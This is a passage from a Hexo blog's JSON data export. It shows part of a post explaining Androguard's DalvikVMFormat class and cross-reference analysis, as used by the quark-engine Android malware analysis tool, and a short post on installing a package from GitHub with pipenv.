class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DalvikVMFormat</span>(bytecode.BuffHandle):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    This class can parse a classes.dex file of an Android application (APK).</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    :param buff: a string which represents the classes.dex file</span></span><br><span class=\"line\"><span class=\"string\">    :param decompiler: associate a decompiler object to display the java source code</span></span><br><span class=\"line\"><span class=\"string\">    :type buff: bytes</span></span><br><span class=\"line\"><span class=\"string\">    :type decompiler: object</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    example::</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        d = DalvikVMFormat( read(&quot;classes.dex&quot;) )</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, buff, decompiler=<span class=\"literal\">None</span>, config=<span class=\"literal\">None</span>, using_api=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">        <span class=\"comment\"># to allow to pass apk object ==&gt; we do not need to pass additionally target version</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(buff, APK):</span><br><span class=\"line\">            self.api_version = buff.get_target_sdk_version()</span><br><span class=\"line\">            buff = buff.get_dex()  <span class=\"comment\"># getting dex from APK file</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> using_api:</span><br><span class=\"line\">            self.api_version = using_api</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.api_version = CONF[<span class=\"string\">&quot;DEFAULT_API&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__(buff)</span><br><span class=\"line\">        self._flush()</span><br><span class=\"line\"></span><br><span class=\"line\">        self.CM = ClassManager(self)</span><br><span class=\"line\">        self.CM.set_decompiler(decompiler)</span><br><span class=\"line\"></span><br><span class=\"line\">        self._preload(buff)</span><br><span class=\"line\">        self._load(buff)</span><br></pre></td></tr></table></figure>\n\n<p>This class can parse a classes.dex file of an Android application (APK).</p>\n<p><strong>androguard&#x2F;core&#x2F;bytecodes&#x2F;dvm.py</strong></p>\n<ul>\n<li>ClassManager</li>\n</ul>\n<p>This class is used to access to all elements (strings, type, proto …) of the dex format based on their offset or index.</p>\n<ul>\n<li>set_decompiler</li>\n</ul>\n<p>Setting the disassembled tool used for disassembling an apk such as Jadx or DAD.</p>\n<p>Last one:</p>\n<p><strong>androguard&#x2F;core&#x2F;analysis&#x2F;analysis.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dx.create_xref()</span><br></pre></td></tr></table></figure>\n\n<p>Create Class, Method, String, and Field crossreferences for all classes in the Analysis.</p>\n<p>If you are using multiple DEX files, this function must be called when all DEX files are added. If you call the function after every DEX file, it will only work for the first time.</p>\n<p>This function is already called in the object Analysis, so we don’t need to call it again.</p>\n<p>The following video records the process of making an DalvikVMFormat object.</p>\n<div class=\"video-container\"><iframe src=\"https://www.youtube.com/embed/Q3oCMVyhGLw\" frameborder=\"0\" loading=\"lazy\" allowfullscreen></iframe></div>\n\n\n<h1 id=\"Important\"><a href=\"#Important\" class=\"headerlink\" title=\"Important\"></a>Important</h1><p>Only when calling the <code>get_source_method</code> function in <a href=\"https://androguard.readthedocs.io/en/latest/api/androguard.decompiler.html#androguard.decompiler.decompiler.DecompilerDAD\">DecompilerDAD</a> is it considered that disassemble an apk.</p>\n<p>In fact, we only use the information in the Dex file and the method of cross-references, as well as the information about android permission. We did not do the disassemble an apk.</p>\n"},{"title":"Pipenv usage","date":"2020-09-24T06:15:06.000Z","_content":"\n# Install from github\n```bash=\npipenv install -e git+https://github.com/quark-engine/quark-engine.git#egg=quark-engine\n```\n* First \"quark-enigne\": user\n* Second \"quark-engine\": repo\n* @develop: The branch what you want to install\n* #egg=quark-engine: The package name that will be recorded in pipenv\n","source":"_posts/pipenv.md","raw":"---\ntitle: Pipenv usage\ndate: 2020-09-24 14:15:06\ntags:\n- python\n- git\n---\n\n# Install from github\n```bash=\npipenv install -e git+https://github.com/quark-engine/quark-engine.git#egg=quark-engine\n```\n* First \"quark-enigne\": user\n* Second \"quark-engine\": repo\n* @develop: The branch what you want to install\n* #egg=quark-engine: The package name that will be recorded in pipenv\n","slug":"pipenv","published":1,"updated":"2023-04-20T07:41:28.346Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepn6000oi7ri33hd86ej","content":"<h1 id=\"Install-from-github\"><a href=\"#Install-from-github\" class=\"headerlink\" title=\"Install from github\"></a>Install from github</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pipenv install -e git+https://github.com/quark-engine/quark-engine.git<span class=\"comment\">#egg=quark-engine</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>First “quark-enigne”: user</li>\n<li>Second “quark-engine”: repo</li>\n<li>@develop: The branch what you want to install</li>\n<li>#egg&#x3D;quark-engine: The package name that will be recorded in pipenv</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Install-from-github\"><a href=\"#Install-from-github\" class=\"headerlink\" title=\"Install from github\"></a>Install from github</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pipenv install -e git+https://github.com/quark-engine/quark-engine.git<span class=\"comment\">#egg=quark-engine</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>First “quark-enigne”: user</li>\n<li>Second “quark-engine”: repo</li>\n<li>@develop: The branch what you want to install</li>\n<li>#egg&#x3D;quark-engine: The package name that will be recorded in pipenv</li>\n</ul>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"clgotepmd0001i7rih6626v0v","tag_id":"clgotepmm0004i7ri45eg0cky","_id":"clgotepmt000ai7rif30m2zmp"},{"post_id":"clgotepmk0003i7rie5936w18","tag_id":"clgotepms0009i7rigxpycwrc","_id":"clgotepn2000ii7rif7ko8dv0"},{"post_id":"clgotepmk0003i7rie5936w18","tag_id":"clgotepmx000di7ridlbrcoyp","_id":"clgotepn3000ki7ri42670p7n"},{"post_id":"clgotepmq0007i7rihz0f9idz","tag_id":"clgotepn0000gi7ri3y254m20","_id":"clgotepn7000ri7rie98a8cug"},{"post_id":"clgotepmq0007i7rihz0f9idz","tag_id":"clgotepn3000li7riafbx0wuo","_id":"clgotepn8000si7ri0oqqaq6w"},{"post_id":"clgotepmq0007i7rihz0f9idz","tag_id":"clgotepn6000pi7rihhoz8e00","_id":"clgotepn8000ui7ri32bg1rpv"},{"post_id":"clgotepmy000ei7ridwop26es","tag_id":"clgotepmx000di7ridlbrcoyp","_id":"clgotepn9000wi7ri3rk4fshv"},{"post_id":"clgotepmy000ei7ridwop26es","tag_id":"clgotepn7000qi7ri33qa6h0a","_id":"clgotepn9000xi7riciwp15jf"},{"post_id":"clgotepmy000ei7ridwop26es","tag_id":"clgotepn8000ti7riaklnempy","_id":"clgotepn9000zi7ri9d44ajh7"},{"post_id":"clgotepn2000ji7rihqe295rn","tag_id":"clgotepmm0004i7ri45eg0cky","_id":"clgotepn90010i7rickdt9fx2"},{"post_id":"clgotepn2000ji7rihqe295rn","tag_id":"clgotepn8000vi7rig4lb6pnw","_id":"clgotepn90011i7ri315waa9e"},{"post_id":"clgotepn6000oi7ri33hd86ej","tag_id":"clgotepmx000di7ridlbrcoyp","_id":"clgotepn90012i7ri48z3gdxs"},{"post_id":"clgotepn6000oi7ri33hd86ej","tag_id":"clgotepn9000yi7ri3o1qf9z4","_id":"clgotepna0013i7ri75bx4tqx"}],"Tag":[{"name":"Android","_id":"clgotepmm0004i7ri45eg0cky"},{"name":"vulnerability","_id":"clgotepms0009i7rigxpycwrc"},{"name":"python","_id":"clgotepmx000di7ridlbrcoyp"},{"name":"Debian","_id":"clgotepn0000gi7ri3y254m20"},{"name":"Linux","_id":"clgotepn3000li7riafbx0wuo"},{"name":"Kali Linux","_id":"clgotepn6000pi7rihhoz8e00"},{"name":"github","_id":"clgotepn7000qi7ri33qa6h0a"},{"name":"pypi","_id":"clgotepn8000ti7riaklnempy"},{"name":"Malware","_id":"clgotepn8000vi7rig4lb6pnw"},{"name":"git","_id":"clgotepn9000yi7ri3o1qf9z4"}]}}